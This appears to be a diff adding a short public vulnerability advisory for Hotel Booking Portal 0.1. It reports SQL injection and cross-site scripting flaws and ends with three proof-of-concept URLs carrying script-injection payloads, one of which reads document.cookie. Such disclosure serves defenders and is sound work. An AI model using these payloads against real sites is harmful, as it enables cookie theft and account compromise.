@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/54980/info
+
+Hotel Booking Portal is prone to multiple SQL-injection vulnerabilities and cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Hotel Booking Portal 0.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/hbportal/includes/languagebar.php?xss=";</script><script>alert(1);</script><script>
+http://www.example.com/hbportal/administrator/login.php?xss=";</script><script>alert(1);</script><script>
+http://www.example.com/hbportal/index.php?lang=";</script><script>alert(document.cookie);</script><script> 
